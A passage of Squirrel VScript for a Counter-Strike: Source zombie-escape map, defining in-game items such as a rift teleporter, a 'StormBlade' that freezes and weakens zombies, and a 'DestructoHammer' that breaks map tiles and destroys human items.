							//EntFireByHandle(logic.tp1,"AddOutput","glowcolor "+col_ready,0.00,null,null);		//__CSS__ no glow exists
							//::NetProps.SetPropInt(logic.tp1,"m_nSKin",0);		//__CSS__ no glow exists
							//EntFireByHandle(logic.tp1,"Skin","0",0.00,null,null);	//__CSS__ no glow exists
							indcol = ""+col_ready;
							//logic._is_ready <- true;
							logic._tp_pos <- tp_pos;
						}
						
						if(targetplayer==null||!targetplayer.IsValid()){}else
						{
							::Ent(self.GetOrigin(),self.GetAngles(),"prop_dynamic",{
									model="models/luffaren/rift.mdl",
									modelscale = 1.50,
									rendermode = 1,
									renderamt = 255,
									rendercolor = "255 255 100 255",
									glowenabled = 1,
									glowdist = 800,
									glowstyle = 0,
									glowcolor = "255 255 255",
								},{
								target = targetplayer,
								master = self,
								ticking = true,
								freeze = false,
								_logic = logic,
								function Tick(){
									if(!ticking){EntFireByHandle(self,"Kill","",0.00,null,null);return;}
									EntFireByHandle(self,"RunScriptCode","Tick();",0.03,null,null);
									if(logic._is_ready)EntFireByHandle(self,"Skin","0",0.00,null,null);
									else EntFireByHandle(self,"Skin","1",0.00,null,null);
									if(target==null||!target.IsValid()||master==null||!master.IsValid()){ticking=false;return;}
									if(freeze)return;
									local dir = target.GetOrigin() - master.GetOrigin();
									if(target.GetClassname()=="player")dir = target.EyePosition() - master.GetOrigin();
									dir.Norm();
									self.SetOrigin(master.GetOrigin()+(dir*35));
									self.SetForwardVector(::AnglesToDir(::DirToAngles(dir)+Vector(90,0,0)));
								},function Run(){
									EntFireByHandle(self,"RunScriptCode","Tick();",0.03,null,null);
									master.GetScriptScope().targetindicator = self;
								}});
						}
						::Ent(self.GetOrigin(),self.GetAngles(),"prop_dynamic",{
								model="models/luffaren/rift.mdl",
								rendermode = 1,
								renderamt = 1,
								modelscale = 0.01,
								glowenabled = 1,
								glowstyle = 1,
								glowdist = 5000,
								glowcolor = ""+indcol,
							},{
							master = self,
							ticking = true,
							scale = 0.01,
							_logic = logic,
							function Tick(){
								if(!ticking)return;
								EntFireByHandle(self,"RunScriptCode","Tick();",0.02,null,null);
								scale += 0.05;
								if(scale>2.50)
								{
									scale = 2.70;
									ticking = false;
								}
								//self.__KeyValueFromFloat("modelscale",scale);
								::NetProps.SetPropFloat(self,"m_flModelScale",scale);
								if(logic._is_ready)EntFireByHandle(self,"Skin","0",0.00,null,null);
								else EntFireByHandle(self,"Skin","1",0.00,null,null);
							},function Run(){
								master.GetScriptScope().redindicator = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
								EntFireByHandle(self,"RunScriptCode","Tick();",0.01,null,null);
							}});
						::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{spawnflags=1},{
							model = self,
							firstframe = true,
							fxcd = false,
							invincibility_time = invincibility_time,
							log=logic,
							ct_t = ct_t,
							col_ready = col_ready,
							col_notready = col_notready,
							function Forgiveness()
							{
								if(activator==null||!activator.IsValid()||activator.IsAlive()==false)return;
									//printl(activator.GetVelocity().z);
								if(activator.GetVelocity().z < -(fabs(::ITEMS.rift.fall_forgive_vel)))
								{
									activator.SetOrigin(model.GetScriptScope().tp_pos);
									activator.SetVelocity(Vector(0,0,0));
								}
							},
							function FloorTick(){
								if(firstframe)return;
								if(model.GetScriptScope().tp_pos == null)return;
								if(ct_t)
									log._is_ready = !(TraceLinePlayersIncluded(model.GetScriptScope().tp_pos,
									model.GetScriptScope().tp_pos+Vector(0,0,-40),null)==1.00||::GetDistance(self.GetOrigin(),::tpdest.GetOrigin()) < 100);
								else
									log._is_ready = !(TraceLinePlayersIncluded(log._tp_pos,
									log._tp_pos+Vector(0,0,-40),null)==1.00||::GetDistance(self.GetOrigin(),::tpdest.GetOrigin()) < 100);
								if(log._is_ready)
								{
									if(log.tp1==null||!log.tp1.IsValid())
										EntFireByHandle(log.tp1,"Skin","0",0.00,null,null);
									if(log.tp2==null||!log.tp2.IsValid()||log.tp2.GetScriptScope().redindicator==null||!log.tp2.GetScriptScope().redindicator.IsValid()){}
									else EntFireByHandle(log.tp2.GetScriptScope().redindicator,"Skin","0",0.00,null,null);
									foreach(e in logic.mhandles)EntFireByHandle(e,"Skin","0",0.00,null,null);
								}
								else
								{
									if(log.tp1==null||!log.tp1.IsValid())
										EntFireByHandle(log.tp1,"Skin","1",0.00,null,null);
									if(log.tp2==null||!log.tp2.IsValid()||log.tp2.GetScriptScope().redindicator==null||!log.tp2.GetScriptScope().redindicator.IsValid()){}
									else EntFireByHandle(log.tp2.GetScriptScope().redindicator,"Skin","1",0.00,null,null);
									foreach(e in logic.mhandles)EntFireByHandle(e,"Skin","1",0.00,null,null);
								}
								
							},
							function Touch()
							{
								if(firstframe)return;
								local toucher = activator;	//__CSS__ activator may get reset, store toucher
								if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
								if(model.GetScriptScope().tp_pos == null)return;
								if(ct_t && toucher.GetTeam()==2)
								{
									if(model.GetScriptScope().logic!=null)model.GetScriptScope().logic.PlacedOutFullyKill();
									return;
								}
								if(ct_t && toucher.GetTeam()!=3)return;
								if(!ct_t && toucher.GetTeam()!=2)return;
								if(invincibility_time==null)
								{
									if(!logic._is_ready)return;
									if(	TraceLinePlayersIncluded(model.GetScriptScope().tp_pos,model.GetScriptScope().tp_pos+Vector(0,0,-40),toucher)==1.00||
										::GetDistance(self.GetOrigin(),::tpdest.GetOrigin()) < 100)
									{
										//if(logic.tp2==null||!logic.tp2.IsValid()||logic.tp2.GetScriptScope().redindicator==null||!logic.tp2.GetScriptScope().redindicator.IsValid()){}
										////else EntFireByHandle(logic.tp2.GetScriptScope().redindicator,"AddOutput","glowcolor "+col_notready,0.00,null,null);		//__CSS__ no glow exists
										//else {::NetProps.SetPropInt(logic.tp2.GetScriptScope().redindicator,"m_nSKin",1);			//__CSS__ no glow exists
										//EntFireByHandle(logic.tp2.GetScriptScope().redindicator,"Skin","1",0.00,null,null);	}	//__CSS__ no glow exists
										//if(logic.tp1==null||!logic.tp1.IsValid()){}
										////else EntFireByHandle(logic.tp1,"AddOutput","glowcolor "+col_notready,0.00,null,null);			//__CSS__ no glow exists
										//else {::NetProps.SetPropInt(logic.tp1,"m_nSKin",1);			//__CSS__ no glow exists
										//EntFireByHandle(logic.tp1,"Skin","1",0.00,null,null);	}	//__CSS__ no glow exists
										return;
									}
									else
									{
										//if(logic.tp2==null||!logic.tp2.IsValid()||logic.tp2.GetScriptScope().redindicator==null||!logic.tp2.GetScriptScope().redindicator.IsValid()){}
										////else EntFireByHandle(logic.tp2.GetScriptScope().redindicator,"AddOutput","glowcolor "+col_ready,0.00,null,null);	//__CSS__ no glow exists
										//else {::NetProps.SetPropInt(logic.tp2.GetScriptScope().redindicator,"m_nSKin",0);		//__CSS__ no glow exists
										//EntFireByHandle(logic.tp2.GetScriptScope().redindicator,"Skin","0",0.00,null,null);	}	//__CSS__ no glow exists
										//if(logic.tp1==null||!logic.tp1.IsValid()){}
										////else EntFireByHandle(logic.tp1,"AddOutput","glowcolor "+col_ready,0.00,null,null);	//__CSS__ no glow exists
										//else {::NetProps.SetPropInt(logic.tp1,"m_nSKin",0);		//__CSS__ no glow exists
										//EntFireByHandle(logic.tp1,"Skin","0",0.00,null,null);	}	//__CSS__ no glow exists
									}
								}
								if(invincibility_time!=null)
								{
									EntFireByHandle(toucher,"RunScriptCode","invinciblehuman<-true;",0.00,null,null);
									EntFire("manager","RunScriptCode","CheckHumanDamageFilter();",0.00,toucher);
									EntFire("manager","RunScriptCode","CheckHumanDamageFilter();",0.01,toucher);
									EntFire("manager","RunScriptCode","CheckHumanDamageFilter();",0.05,toucher);
									EntFireByHandle(toucher,"RunScriptCode","if(\"invinciblehuman\" in this)delete invinciblehuman;",invincibility_time,null,null);
								}
								
								if("_tp_pos" in logic) toucher.SetOrigin(logic._tp_pos);
								else toucher.SetOrigin(model.GetScriptScope().tp_pos);
								
								
								
								if(::ITEMS.rift.fall_forgive_time!=null && ct_t)
									EntFireByHandle(self,"RunScriptCode","Forgiveness();",::ITEMS.rift.fall_forgive_time,toucher,null);
								::Sound("*luffaren/rift_teleport.mp3",Vector(),toucher,-1,0.05,100,10);
								if(fxcd)return;
								fxcd = true;
								EntFireByHandle(self,"RunScriptCode"," fxcd = false; ",0.10,null,null);
								::Sound("*luffaren/rift_teleport.mp3",toucher.GetOrigin()+Vector(0,0,48),null,1000,0.05,RandomInt(90,110),10);
								::Particle("water_splash_01_refract",toucher.GetOrigin()+Vector(0,0,48),Vector(),null,0.05);
								::Sound("*luffaren/rift_teleport.mp3",self.GetOrigin()+Vector(0,0,0),null,1000,0.05,RandomInt(90,110),10);
								::Particle("water_splash_01_refract",self.GetOrigin()+Vector(0,0,0),Vector(),null,0.05);
							},function Run(){
								AddThinkToEnt(self,"FloorTick");
								EntFireByHandle(self,"SetParent","!activator",0.00,model,null);
								EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
								EntFireByHandle(self,"AddOutput","mins -1 -1 -30",0.00,null,null);
								EntFireByHandle(self,"AddOutput","maxs 1 1 30",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
								EntFireByHandle(self,"Enable","",0.50,null,null);
								EntFireByHandle(self,"RunScriptCode"," firstframe = false; ",0.70,null,null);
							}});
					}
					else
					{
						target_scale = 1.50;
						if(ct_t)
						{
							if(logic!=null)logic.tp1 = self;
							logic.tp2.GetScriptScope().tp_pos = Vector()+tp_pos;
							
							//EntFireByHandle(logic.tp2.GetScriptScope().redindicator,"AddOutput","glowcolor "+col_ready,0.00,null,null);		//__CSS__ no glow exists
							//EntFireByHandle(self,"AddOutput","glowcolor "+col_ready,0.00,null,null);		//__CSS__ no glow exists
							
							//::NetProps.SetPropInt(logic.tp2.GetScriptScope().redindicator,"m_nSKin",0);			//__CSS__ no glow exists
							//::NetProps.SetPropInt(self,"m_nSKin",0);			//__CSS__ no glow exists
							//EntFireByHandle(logic.tp2.GetScriptScope().redindicator,"Skin","0",0.00,null,null);		//__CSS__ no glow exists
							//EntFireByHandle(self,"Skin","0",0.00,null,null);		//__CSS__ no glow exists
							
							
							EntFireByHandle(self,"AddOutput","glowenabled 1",0.00,null,null);
							EntFireByHandle(self,"AddOutput","glowstyle 1",0.00,null,null);
							EntFireByHandle(self,"AddOutput","glowdist 5000",0.00,null,null);
							if(logic.tp2.GetScriptScope().targetindicator != null)
								logic.tp2.GetScriptScope().targetindicator.GetScriptScope().freeze = true;
						}
						else if(logic!=null)
						{
							logic.tp1 = self;
							
							//EntFireByHandle(self,"AddOutput","glowcolor "+col_notready,0.00,null,null);		//__CSS__ no glow exists
							
							//::NetProps.SetPropInt(self,"m_nSKin",1);			//__CSS__ no glow exists
							//EntFireByHandle(self,"Skin","1",0.00,null,null);		//__CSS__ no glow exists
							
							EntFireByHandle(self,"AddOutput","glowenabled 1",0.00,null,null);
							EntFireByHandle(self,"AddOutput","glowstyle 1",0.00,null,null);
							EntFireByHandle(self,"AddOutput","glowdist 5000",0.00,null,null);
						}
					}
				}});
		}
	},
	storm_blade = {
			team = 3,
			hammerid = 5,	//example: 1 (range 1-999)
			player_scan_range = 800,
			player_scan_range_postslow = 800,
			postslow_amount = -0.45,
			postslow_time = 15.00,
			modelspawn_range = 400,
			modelspawn_amount = 25,
			hp_percentage = 0.02,
			cooldown = 150.00,
			bosshit_radius = 500,
			bosshit_damage = 10000,
			bosshit_stunchance = 90.00,
			bosshit_stuntime_add = 7.00,
		function Spawn(pos){
			
			
			::CreateItem(pos,Vector(),1,"StormBlade","("+cooldown.tostring()+"s)\nFreezes and weakens zombies with a dimension-breaking slice\n"+
			"Once unfrozen, nearby z's gets slowed for "+postslow_time.tostring()+"s\n"+
			"Z-hp gets reduced to "+(hp_percentage*100).tostring()+"%"+"\nCan hurt/stun boss",{
			//__CSS__ game_text char limit, old below(v), new above(^)
			/*
			::CreateItem(pos,Vector(),1,"StormBlade","("+cooldown.tostring()+"s)\nFreeze and weaken zombies with a dimension-breaking slice\n"+
			"Z-hp gets reduced to "+(hp_percentage*100).tostring()+"% of their current health\n"+
			"It only freezes nearby zombies the first moment on-use\n"+
			"Once the post-cut hp-cap hits, nearby z's gets slowed for "+postslow_time.tostring()+"s\nCan hurt/stun boss",{
			*/

				cooldown = cooldown,
				model = null,
				function CloseHilt()
				{
					::Particle("muzzle_smgs",model.GetOrigin()+Vector(0,0,-2),Vector(),null,0.05);
					::Particle("blood_impact_synth_01_short",model.GetOrigin()+Vector(0,0,-2),Vector(),null,0.05);
					::Particle("blood_impact_synth_01_short",model.GetOrigin()+Vector(0,0,-2),Vector(),null,0.05);
					::Particle("blood_impact_synth_01_short",model.GetOrigin()+Vector(0,0,-2),Vector(),null,0.05);
					::Particle("blood_impact_synth_01_short",model.GetOrigin()+Vector(0,0,-2),Vector(),null,0.05);
				},
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/storm_blade_sword.mdl");
						::Ent(button.GetOrigin()+(button.GetLeftVector()*8),button.GetAngles()+Vector(0,110,0),"prop_dynamic",{
								model="models/luffaren/storm_blade_sword.mdl",
								rendermode = 1,
								glowenabled = 1,
								glowstyle = 3,
								glowdist = 5000,
								glowcolor = Vector(0,200,255),
							},{
							button = button,
							logic=this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
							}});
					}
					//else if(event==2){}//pickup
					else if(event==3){}//drop
					else if(event==4)//use_failed
					{
						EntFireByHandle(model,"AddOutput","rendercolor 50 50 50",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255",0.05,null,null);
					}
					else if(event==5)//use
					{
						if(!::MOTHER_ZOMBIE_SPAWNED)return false;
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = 0.00+cooldown;
						EntFireByHandle(model,"SetAnimation","use",0.00,null,null);
						EntFireByHandle(model,"SetDefaultAnimation","idle",0.02,null,null);
						EntFireByHandle(model,"SetPlaybackRate","0.20",0.01,null,null);
						EntFireByHandle(model,"AddOutput","glowenabled 0",0.00,null,null);
						::ITEMS.storm_blade.SpawnStorm(button.GetOrigin());
						EntFireByHandle(holder,"RunScriptCode"," logic.CloseHilt(); ",7.00,null,null);
						::Particle("muzzle_smgs",model.GetOrigin()+Vector(0,0,0),Vector(),null,0.05);
						::Particle("blood_impact_synth_01_short",model.GetOrigin()+Vector(0,0,RandomFloat(-5,2)),Vector(),null,0.05);
						::Particle("blood_impact_synth_01_short",model.GetOrigin()+Vector(0,0,RandomFloat(-5,2)),Vector(),null,0.05);
						::Particle("blood_impact_synth_01_short",model.GetOrigin()+Vector(0,0,RandomFloat(-5,2)),Vector(),null,0.05);
						::HurtStunBoss(	button.GetOrigin()+(button.GetForwardVector()*0)+Vector(0,0,100),
							::ITEMS.storm_blade.bosshit_radius,::ITEMS.storm_blade.bosshit_damage,
							::ITEMS.storm_blade.bosshit_stunchance,::ITEMS.storm_blade.bosshit_stuntime_add,null);
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","glowenabled 1",0.00,null,null);
					}
				}},hammerid);
		},function SpawnStorm(pos){
			::Ent(pos,Vector(),"point_tesla",{		//__CSS__ og was 'prop_dynamic' (but no model? wtf?)
					targetname="i_stormblade",
					
				},{
				pos = pos,
				plist = [],
				sounds = [],
				piecelist = [],
				function StopPlayer(){
					if(ended)return;
					if(activator==null||!activator.IsValid()||activator.IsAlive()==false||activator.GetTeam()!=2)return;
					EntFireByHandle(activator,"AddOutput","movetype 0",0.00,null,null);
				},function Start(){
					for(local h;h=Entities.FindByClassnameWithin(h,"player",pos,::ITEMS.storm_blade.player_scan_range);)
					{
						if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=2)continue;
						h.ValidateScriptScope();if("invincible" in h.GetScriptScope())continue;
						plist.push(h);
						h.SetVelocity(Vector(0,0,550));
						EntFireByHandle(self,"RunScriptCode","StopPlayer();",0.80,h,null);
					}
				},
				ended = false,
				function End(stopmusic=false){
					if(ended)return;
					ended = true;
					foreach(p in plist)
					{
						if(p==null||!p.IsValid())continue;
						EntFireByHandle(p,"AddOutput","movetype 2",0.00,null,null);
						if(stopmusic)continue;
						p.ValidateScriptScope();if("invincible" in p.GetScriptScope())continue;		//new in v1_6
						local newhp = p.GetHealth() * ::ITEMS.storm_blade.hp_percentage;
						if(newhp<1)newhp=1;
						p.SetHealth(newhp);
						p.SetVelocity(Vector(0,0,300));
					}
					if(stopmusic)	//hit by destructo_hammer
					{
						foreach(s in sounds)
						{
							if(s==null||!s.IsValid())continue;
							EntFireByHandle(s,"StopSound","",0.00,null,null);
							EntFireByHandle(s,"Volume","0",0.00,null,null);
							EntFireByHandle(s,"Kill","",0.05,null,null);
						}
						foreach(p in this.piecelist)
						{
							if(p==null||!p.IsValid())continue;
							EntFireByHandle(p,"RunScriptCode","KillStart();",0.00,null,null);
						}
						::Sound("*luffaren/papaj_nooo.mp3",pos,null,100000,2.00,RandomInt(40,50),10);
						::Sound("*luffaren/papaj_nooo.mp3",pos,null,100000,2.00,RandomInt(60,70),10);
						::Sound("*luffaren/papaj_nooo.mp3",pos,null,100000,1.00,RandomInt(70,80),10);
					}
					else
					{
						for(local h;h=Entities.FindByClassnameWithin(h,"player",pos,::ITEMS.storm_blade.player_scan_range_postslow);)
						{
							if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=2)continue;
							h.ValidateScriptScope();if("invincible" in h.GetScriptScope())continue;
							EntFire("manager","RunScriptCode",
								" AddSpeed("+::ITEMS.storm_blade.postslow_amount.tostring()+","+::ITEMS.storm_blade.postslow_time.tostring()+"); ",
								0.00,h);
						}
					}
				},function Run(){
					EntFireByHandle(self,"RunScriptCode"," Start(); ",0.10,null,null);
					EntFireByHandle(self,"RunScriptCode"," End(); ",7.10,null,null);
					EntFireByHandle(self,"Kill","",8.00,null,null);
					for(local i=0;i<3;i++)
						::Sound("*luffaren/i_am_the_storm_cut.mp3",pos,null,100000,8.00,100,10,
							{master=self,function Run(){master.GetScriptScope().sounds.push(soundhandle)}});
					local ofs = 0+::ITEMS.storm_blade.modelspawn_range;
					local pq = [];	//new in v1_6 - put into process-array to not spawn it all the same frame/causing hiccups
					local qrate_state = true;
					for(local i=0;i<::ITEMS.storm_blade.modelspawn_amount;i++)
					{
						qrate_state = !qrate_state;
						local qrate = 0.01;
						if(qrate_state)qrate = 0.00;
						pq.push({
							qrate=qrate,
							pos=pos,
							ofs=ofs,
							master=self,
							function Run(){
								::Ent(this.pos+Vector(RandomInt(-this.ofs,this.ofs),RandomInt(-this.ofs,this.ofs),RandomInt(-(this.ofs/3),(this.ofs/1.5))),
									Vector(RandomInt(0,360),RandomInt(0,360),RandomInt(0,360)),"prop_dynamic",{
										model="models/luffaren/storm_blade_refract.mdl",
										rendermode = 1,
										modelscale = RandomFloat(5.00,30.00),
										glowenabled = 1,
										glowdist = 1000,
										glowstyle = 2,
										glowcolor = Vector(200,220,255),
									},{
									gottakill = false,
									vel = Vector(0,0,0),
									rotvel = Vector(0,0,0),
									master = this.master,
									function ParticleRun(end_start)
									{
										if(RandomInt(1,8)!=1)return;
										if(!end_start)
											::Particle("explosion_huge_c",self.GetOrigin(),Vector(),null,0.05);
										else
										{
											::Particle("blood_impact_green_02_chunk",self.GetOrigin()+Vector(0,0,RandomInt(-200,0)),Vector(),null,0.05);
											if(RandomInt(1,2)!=1)return;
											::Particle("explosion_huge_g",self.GetOrigin(),Vector(),null,0.05);
											if(RandomInt(1,2)!=1)return;
											::Particle("water_splash_01_refract",self.GetOrigin(),Vector(),null,0.05);
											::Particle("explosion_huge_c",self.GetOrigin(),Vector(),null,0.05);
										}
									},
									killstarted = false,
									function KillStart()
									{
										if(killstarted)return;
										killstarted = true;
										EntFireByHandle(self,"RunScriptCode"," ParticleRun(true); ",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode"," KillTick(); ",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode"," gottakill = true; ",0.00+RandomFloat(0.10,5.00),null,null);
										EntFireByHandle(self,"RunScriptCode"," self.__KeyValueFromFloat(\"modelscale\",RandomFloat(4.00,8.00)); ",0.00,null,null);
										EntFireByHandle(self,"AddOutput","rendercolor 0 0 0",0.00,null,null);
									},
									function KillTick()
									{
										if(gottakill)
										{
											EntFireByHandle(self,"Kill","",0.00,null,null);
											return;
										}
										EntFireByHandle(self,"RunScriptCode"," KillTick(); ",0.02,null,null);
										self.SetOrigin(self.GetOrigin()+vel);
										local sang = self.GetAngles();
										self.SetAngles(sang.x + rotvel.x,sang.y + rotvel.y,sang.z + rotvel.z);
										vel.z -= 0.50;
									},function Run(){
										EntFireByHandle(self,"RunScriptCode"," ParticleRun(false); ",0.00,null,null);
										local glowdisable_time = RandomFloat(0.10,0.80);
										EntFireByHandle(self,"AddOutput","glowenabled 0",glowdisable_time,null,null);
										EntFireByHandle(self,"AddOutput","glowdist 0",glowdisable_time,null,null);
										EntFireByHandle(self,"SetAnimation","move_"+RandomInt(1,5).tostring(),0.00,null,null);
										EntFireByHandle(self,"RunScriptCode"," self.__KeyValueFromFloat(\"playbackrate\",RandomFloat(1.00,10.00)); ",0.02,null,null);
										EntFireByHandle(self,"RunScriptCode"," KillStart(); ",7.00,null,null);
										vel.x = RandomFloat(-10.00,10.00);
										vel.y = RandomFloat(-10.00,10.00);
										vel.z = RandomFloat(-1.00,20.00);
										rotvel.x = RandomFloat(-5.00,5.00);
										rotvel.y = RandomFloat(-5.00,5.00);
										rotvel.z = RandomFloat(-5.00,5.00);
										if(this.master.GetScriptScope().ended)EntFireByHandle(self,"RunScriptCode"," KillStart(); ",0.05,null,null);
										this.master.GetScriptScope().piecelist.push(self);
									}});
							}});
					}
					::Process(pq,0.01);
				}});
		}
	},
	destructo_hammer = {
			team = 2,
			hammerid = 4,	//example: 1 (range 1-999)
			cooldown = 3.00,
			uses = 5,
			magnitude = 120,			//__CSS__ og was 150
			radiusoverride = 0,
			itemdestroy_radius = 150,					//destroys held human items at this distance
			itemdestroy_radius_place = 400,				//destroys placed human items at this distance (claymore, peanutbutter, earth, billnye)
			itemdestroy_radius_stormblade = 800,		//destroys/cancels active stormblade at this range
		function Spawn(pos){
				//OLD (from v1_6) ---- v1_7 will lock the use instead, unlocking it for finale endrun instead
				//if(::finale_started){
				//	if(::zombie_items_spawning_in_spawn)//pick a new item to spawn once in spawn, people are gonna whine about it otherwise
				//	EntFire("manager","RunScriptCode"," SpawnZombieItemsInSpawn(true); ",0.00,null);return;}
			
			
			
			
			::CreateItem(pos,Vector(),3,"DestructoHammer","("+cooldown.tostring()+"s|"+uses.tostring()+"x)"+
					"\nBreak map tiles in front of you + deal damage"+
					"\nDestroys nearby human items"+
					"\nBroken tile-area slows Z's for "+::killtiles_tslow_time.tostring()+"s"+
					"\nUnusable in some spots",{
			//__CSS__ game_text char limit, old below(v), new above(^)
			/*
			::CreateItem(pos,Vector(),3,"DestructoHammer","("+cooldown.tostring()+"s|"+uses.tostring()+"x)"+
					"\nBreak map tile(s) just in front of you\n(short radius, be accurate!)"+
					"\nDestroys nearby human items"+
					"\nDeals slight AoE-damage to humans\n"+
					"Hit map tile(s) turn red and fall after "+::killtiles_tslow_falltime.tostring()+"s"+
					"\nJumping through the broken tile-area slows Z's heavily for "+::killtiles_tslow_time.tostring()+"s\n"+
					"(slow-trigger disappears "+::killtiles_tslow_tcleantime.tostring()+"s after the tile falls)"+
					"\nUnusable during the early finale"+
					"",{
			*/
				
				
				model = null,
				uses = (0+::ITEMS.destructo_hammer.uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/destructo_hammer.mdl");
						::Ent(button.GetOrigin()+(button.GetLeftVector()*10)+Vector(0,0,-30),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/destructo_hammer.mdl",
								modelscale = 0.90,
								rendermode = 1,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
								EntFireByHandle(self,"SetDefaultAnimation","idle",0.02,null,null);
							}});
					}
					else if(event==2)//pickup
					{
						EntFireByHandle(user,"AddOutput","health "+::Z_ITEM_HP.tostring(),0.00,null,null);
					}
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(::finale_started && !::finale_endrun_started)	//NEW in v1_7 - disallow using it during finale EXCEPT for the endrun
						{
							EntFireByHandle(model,"AddOutput","rendercolor 255 0 0",0.00,null,null);
							EntFireByHandle(model,"AddOutput","modelscale 0.50",0.00,null,null);
							EntFireByHandle(model,"AddOutput","rendercolor 255 255 255",0.20,null,null);
							EntFireByHandle(model,"AddOutput","modelscale 0.90",0.20,null,null);
							return;
						}
						button.GetScriptScope().cooldown = 0.00+::ITEMS.destructo_hammer.cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","modelscale 0.50",1.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 50 50 50",1.00,null,null);
						EntFireByHandle(model,"SetAnimation","smash",0.00,null,null);
						EntFireByHandle(model,"SetDefaultAnimation","idle",0.02,null,null);
						try{
						::manager.GetScriptScope().KillTilesWithin(button.GetOrigin()+(button.GetForwardVector()*96),60,5000,false,false,false,true);
						}catch(e){printl("::ITEM.destructo_hammer KillTilesWithin error: "+e);}
						::Ent(button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-10),Vector(),"env_explosion",{
								//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
								iMagnitude = (0+::ITEMS.destructo_hammer.magnitude),	//* ::HURTPLAYER_mult_ct      //nah too risky
								iRadiusOverride = (0+::ITEMS.destructo_hammer.radiusoverride),
								rendermode = 5,
								spawnflags = 2,
								rendercolor = "255 255 255",
							},{_user=user,function Run(){
								
								::ITEMS.bomb_chuck.explosion_owner = this._user;			//yoinked for killcreds
								::ITEMS.bomb_chuck.explosion_handle = self;					//yoinked for killcreds
								EntFireByHandle(self,"Explode","",0.00,null,null);
								EntFireByHandle(self,"Kill","",0.05,null,null);
								
							}});
						local killed_item = 0;
						local killed_peanutbutter = 0;
						local killed_claymore= 0;
						local killed_earthcrystal = 0;
						local killed_billnye = 0;
						local killed_stormblade = 0;
						for(local h;h=Entities.FindByNameWithin(h,"i_peanutbutter",button.GetOrigin()+
							(button.GetForwardVector()*96)+Vector(0,0,-40),::ITEMS.destructo_hammer.itemdestroy_radius_place);){
								EntFireByHandle(h,"Kill","",0.00,null,null);
								killed_peanutbutter++;
							}
						for(local h;h=Entities.FindByNameWithin(h,"i_claymore",button.GetOrigin()+
							(button.GetForwardVector()*96)+Vector(0,0,-40),::ITEMS.destructo_hammer.itemdestroy_radius_place);){
								EntFireByHandle(h,"Kill","",0.00,null,null);
								killed_claymore++;
							}
						for(local h;h=Entities.FindByNameWithin(h,"i_earthcrystal_earth",button.GetOrigin()+
							(button.GetForwardVector()*96)+Vector(0,0,-40),::ITEMS.destructo_hammer.itemdestroy_radius_place);){
								EntFireByHandle(h,"RunScriptCode","Clean();",0.00,null,null);
								killed_earthcrystal++;
							}
						for(local h;h=Entities.FindByNameWithin(h,"i_billnye",button.GetOrigin()+
							(button.GetForwardVector()*96)+Vector(0,0,-40),::ITEMS.destructo_hammer.itemdestroy_radius_place);){
								EntFireByHandle(h,"RunScriptCode","Stop();",0.00,null,null);
								killed_billnye++;
							}
						for(local h;h=Entities.FindByNameWithin(h,"item_*",button.GetOrigin()+
							(button.GetForwardVector()*96)+Vector(0,0,-40),::ITEMS.destructo_hammer.itemdestroy_radius);){
								if(h.GetMoveParent().GetMoveParent()==null||!h.GetMoveParent().GetMoveParent().IsValid()||
								h.GetMoveParent().GetMoveParent().GetTeam()!=3)continue;
								local iname = h.GetName().slice(5,h.GetName().len());
								::PlayerNameMessage(h.GetMoveParent().GetMoveParent(),"DestructoHammer destructed "+iname+" (held by ",")",0.00);
								EntFireByHandle(h,"Kill","",0.00,null,null);
								killed_item++;
							}
						for(local h;h=Entities.FindByName(h,"i_stormblade");)
						{
							h.ValidateScriptScope();
							if(!("pos" in h.GetScriptScope()))continue;
							if(::GetDistance(button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),
							h.GetScriptScope().pos) < ::ITEMS.destructo_hammer.itemdestroy_radius_stormblade)
							{
								EntFireByHandle(h,"RunScriptCode","End(true);",0.00,null,null);
								killed_stormblade++;
							}
						}
						::Sound("*luffaren/clang.mp3",button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),null,150000,5.00,RandomInt(15,20),10);
						::Sound("*luffaren/clang.mp3",button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),null,50000,0.05,RandomInt(60,70),10);
						::Sound("*luffaren/clang.mp3",button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),null,50000,0.05,RandomInt(50,60),10);
